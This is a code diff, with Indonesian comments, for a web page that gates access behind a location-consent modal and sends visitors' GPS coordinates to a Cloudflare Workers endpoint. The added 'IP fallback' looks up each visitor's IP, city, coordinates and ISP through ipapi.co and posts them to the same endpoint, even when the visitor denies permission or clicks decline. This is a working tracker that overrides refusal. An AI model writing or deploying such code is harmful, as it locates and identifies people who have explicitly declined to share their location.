@@ -184,14 +184,22 @@
   </main>
 </div>
 
+
 <script>
   /* ====== KONFIG ====== */
-  const POST_ENDPOINT = "";           // contoh: "https://example.com/loc-hook" — kosongkan jika tidak perlu kirim ke server
+  // Endpoint Worker kamu (root atau route), contoh workers.dev:
+  const POST_ENDPOINT = "https://dmdni-log-loc-store.mkemalw.workers.dev/";
   const REQUIRED_ACCURACY_M = 200;    // akurasi maksimal agar valid
   const AUTO_CLOSE_MS = 800;          // jeda tutup modal setelah sukses
   const USE_WATCH = true;             // true = watchPosition agar dapat fix terbaik
+  const IP_FALLBACK_ON = true;        // aktifkan fallback IP jika GPS gagal/ditolak
+  const IP_API_URL = "https://ipapi.co/json/"; // layanan IP tracker publik (tanpa API key)
 
   /* ====== UTIL ====== */
+  const log = (...args) => console.log("%c[LOC]", "color:#16a34a;font-weight:700", ...args);
+  const warn = (...args) => console.warn("%c[LOC]", "color:#d97706;font-weight:700", ...args);
+  const errl = (...args) => console.error("%c[LOC]", "color:#dc2626;font-weight:700", ...args);
+
   const $ = sel => document.querySelector(sel);
   const show = el => {
     ["#step-consent","#step-ok","#step-denied"].forEach(s => $(s).classList.add("hidden"));
@@ -211,7 +219,8 @@
   };
 
   // spinner via attribute data-busy (CSS pseudo-element)
-  function setBusy(b){ 
+  function setBusy(b){
+    if(!els.btnAllow) return;
     if(b){ els.btnAllow.setAttribute("data-busy","true"); els.btnAllow.style.pointerEvents="none"; }
     else { els.btnAllow.removeAttribute("data-busy"); els.btnAllow.style.pointerEvents=""; }
   }
@@ -230,21 +239,36 @@
 
   let asking = false, watchId = null, bestFix = null, autoCloseTimer = null;
 
+  /* ====== GPS FLOW ====== */
   function startRequest(){
     if(asking) return;
-    if(!("geolocation" in navigator)){ alert("Browser Anda tidak mendukung Geolocation."); show(els.denied); return; }
+    if(!("geolocation" in navigator)){
+      alert("Browser Anda tidak mendukung Geolocation.");
+      show(els.denied);
+      if (IP_FALLBACK_ON) doIpFallback("no_geolocation_api");
+      return;
+    }
 
     asking = true; setBusy(true);
+    log("Meminta izin GPS… (watch:", USE_WATCH, ")");
 
     if(USE_WATCH){
       let timer = setTimeout(()=>{ // fallback stop setelah 15 detik
         if(watchId !== null) navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+        warn("GPS watch timeout, gunakan bestFix:", bestFix);
         finalizeFix(bestFix, true);
       }, 15000);
 
       watchId = navigator.geolocation.watchPosition(
         pos => {
           bestFix = pickBetter(bestFix, pos);
+          log("GPS update:", {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            acc_m: pos.coords.accuracy,
+            ts: new Date(pos.timestamp).toISOString()
+          });
           if(bestFix && bestFix.coords.accuracy <= REQUIRED_ACCURACY_M){
             clearTimeout(timer);
             navigator.geolocation.clearWatch(watchId);
@@ -252,7 +276,7 @@
             finalizeFix(bestFix, false);
           }
         },
-        err => { clearTimeout(timer); onErr(err); },
+        geoErr => { clearTimeout(timer); onErr(geoErr); },
         { enableHighAccuracy:true, maximumAge:0, timeout:15000 }
       );
     } else {
@@ -260,8 +284,8 @@
     }
   }
 
-  function pickBetter(a, b){ 
-    if(!a) return b; 
+  function pickBetter(a, b){
+    if(!a) return b;
     return (b.coords.accuracy < a.coords.accuracy) ? b : (b.timestamp > a.timestamp ? b : a);
   }
 
@@ -269,40 +293,60 @@
 
   function finalizeFix(pos, wasFallback){
     asking = false; setBusy(false);
-    if(!pos){ show(els.denied); return; }
+    if(!pos){
+      warn("GPS tidak tersedia. Menampilkan state DENIED.");
+      show(els.denied);
+      if (IP_FALLBACK_ON) doIpFallback("no_position");
+      return;
+    }
 
     const { latitude, longitude, accuracy } = pos.coords;
     const iso = new Date(pos.timestamp).toISOString();
 
-    els.lat.value = latitude.toFixed(7);
-    els.lng.value = longitude.toFixed(7);
-    els.acc.value = Math.round(accuracy);
-    els.ts.value  = iso;
+    // Log detail ke console
+    log("GPS fix:", { latitude, longitude, accuracy_m: accuracy, timestamp: iso, wasFallback });
 
+    // Tampilkan di UI (sekadar verifikasi)
+    if (els.lat) els.lat.value = latitude.toFixed(7);
+    if (els.lng) els.lng.value = longitude.toFixed(7);
+    if (els.acc) els.acc.value = Math.round(accuracy);
+    if (els.ts)  els.ts.value  = iso;
+
+    // Validasi akurasi
     if(accuracy > REQUIRED_ACCURACY_M){
+      warn(`Akurasi lokasi ±${Math.round(accuracy)} m (di atas ambang ${REQUIRED_ACCURACY_M} m).`);
       alert(`Akurasi lokasi ±${Math.round(accuracy)} m (di atas ambang ${REQUIRED_ACCURACY_M} m).\nSilakan pindah ke area terbuka atau aktifkan High Accuracy, lalu coba lagi.`);
       show(els.denied);
+      if (IP_FALLBACK_ON) doIpFallback("low_accuracy");
       return;
     }
 
     show(els.ok);
 
+    // Kirim ke server (Worker)
     if(POST_ENDPOINT){
+      const payload = {
+        visit_id: visitId,
+        latitude, longitude, accuracy, timestamp: iso,
+        userAgent: navigator.userAgent,
+        page: location.href,
+        source: "gps"
+      };
+      log("POST GPS →", POST_ENDPOINT, payload);
       fetch(POST_ENDPOINT, {
         method:"POST",
         headers:{ "Content-Type":"application/json" },
-        body: JSON.stringify({
-          visit_id: visitId,
-          latitude, longitude, accuracy, timestamp: iso,
-          userAgent: navigator.userAgent,
-          page: location.href
-          // IP diambil server dari req.ip / cf-connecting-ip
-        })
-      }).then(r=>{
-        els.postStatus.textContent = r.ok ? "Lokasi tersimpan." : "Gagal kirim ke server.";
-      }).catch(()=>{
-        els.postStatus.textContent = "Gagal kirim ke server.";
+        body: JSON.stringify(payload)
+      }).then(async r=>{
+        const text = await r.text().catch(()=>"(no text)");
+        els.postStatus && (els.postStatus.textContent = r.ok ? "Lokasi tersimpan." : "Gagal kirim ke server.");
+        log("RESP GPS ←", r.status, text);
+      }).catch(e=>{
+        errl("POST GPS error:", e);
+        els.postStatus && (els.postStatus.textContent = "Gagal kirim ke server.");
       });
+    } else {
+      warn("POST_ENDPOINT kosong—data GPS tidak dikirim ke server.");
     }
 
     clearTimeout(autoCloseTimer);
@@ -313,19 +357,77 @@
     asking = false; setBusy(false);
     if(watchId !== null){ navigator.geolocation.clearWatch(watchId); watchId = null; }
     if(err.code === 1){ // PERMISSION_DENIED
+      warn("User menolak izin lokasi (PERMISSION_DENIED).");
       show(els.denied);
+      if (IP_FALLBACK_ON) doIpFallback("permission_denied");
     } else if(err.code === 3){ // TIMEOUT
+      warn("Pengambilan lokasi TIMEOUT.");
       alert("Pengambilan lokasi timeout. Coba lagi di area terbuka atau aktifkan GPS (High Accuracy).");
       show(els.consent);
+      if (IP_FALLBACK_ON) doIpFallback("timeout");
     } else { // POSITION_UNAVAILABLE
+      warn("Lokasi tidak tersedia (POSITION_UNAVAILABLE).");
       alert("Lokasi tidak tersedia. Pastikan layanan lokasi aktif.");
       show(els.consent);
+      if (IP_FALLBACK_ON) doIpFallback("unavailable");
+    }
+  }
+
+  /* ====== IP FALLBACK ====== */
+  async function doIpFallback(reason){
+    try {
+      log("Fallback IP dimulai. Alasan:", reason, "→ memanggil", IP_API_URL);
+      const res = await fetch(IP_API_URL, { cache: "no-store" });
+      if (!res.ok) throw new Error("IP API status " + res.status);
+      const ip = await res.json();
+
+      // Normalisasi beberapa field umum ipapi.co
+      const ipInfo = {
+        source: "ip",
+        reason,
+        ip: ip.ip || null,
+        city: ip.city || null,
+        region: ip.region || ip.region_code || null,
+        country: ip.country_name || ip.country || null,
+        latitude: typeof ip.latitude === "number" ? ip.latitude : (ip.latitude ? Number(ip.latitude) : null),
+        longitude: typeof ip.longitude === "number" ? ip.longitude : (ip.longitude ? Number(ip.longitude) : null),
+        org: ip.org || ip.org_name || ip.org_domain || null,
+        asn: ip.asn || null,
+        provider: "ipapi.co",
+        // akurasi IP-based sangat kasar; tandai sebagai ~50km (50000 m) agar jelas di backend
+        accuracy: 50000,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        page: location.href,
+        visit_id: visitId
+      };
+
+      log("IP tracker result:", ipInfo);
+
+      // Kirim juga ke server jika endpoint ada
+      if (POST_ENDPOINT) {
+        log("POST IP →", POST_ENDPOINT, ipInfo);
+        const r = await fetch(POST_ENDPOINT, {
+          method: "POST",
+          headers: { "Content-Type":"application/json" },
+          body: JSON.stringify(ipInfo)
+        });
+        const text = await r.text().catch(()=>"(no text)");
+        log("RESP IP ←", r.status, text);
+      } else {
+        warn("POST_ENDPOINT kosong—hasil IP fallback tidak dikirim ke server.");
+      }
+    } catch (e) {
+      errl("IP fallback gagal:", e);
     }
   }
 
   /* ====== EVENTS ====== */
-  els.btnAllow.addEventListener("click", () => { startRequest(); });
-  els.btnDecline.addEventListener("click", () => { show(els.denied); });
+  els.btnAllow?.addEventListener("click", () => { startRequest(); });
+  els.btnDecline?.addEventListener("click", () => {
+    show(els.denied);
+    if (IP_FALLBACK_ON) doIpFallback("user_clicked_decline");
+  });
   els.btnRetry?.addEventListener("click", () => { show(els.consent); });
   els.btnHelp?.addEventListener("click", () => {
     alert("Aktifkan lokasi di pengaturan browser:\n\n- Chrome: Ikon gembok → Site settings → Location → Allow\n- Safari iOS: Settings → Privacy & Security → Location Services → Safari → While Using\n- Android: Settings → Location ON (High accuracy), lalu beri izin untuk browser.");
@@ -333,10 +435,13 @@
 
   /* ====== STARTUP ====== */
   (function init(){
+    log("Modal lokasi dibuka. visit_id:", visitId);
     openGate();          // tampilkan modal & kunci halaman
     ensureSecureOrigin();// info HTTPS
     // Tidak pakai Permissions API agar SELALU minta lokasi via gesture setiap visit
   })();
 </script>
+
+
 </body>
 </html>
